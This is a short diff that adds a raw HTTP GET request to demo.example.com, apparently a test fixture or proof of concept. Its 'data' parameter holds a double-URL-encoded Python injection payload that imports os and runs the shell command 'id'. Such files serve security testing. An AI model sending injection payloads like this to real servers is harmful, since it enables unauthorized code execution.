@@ -1,0 +1,4 @@
+GET /a?data=q%253D__import__%2528%2527os%2527%2529.popen%2528%2527id%2527%2529.read%2528%2529 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
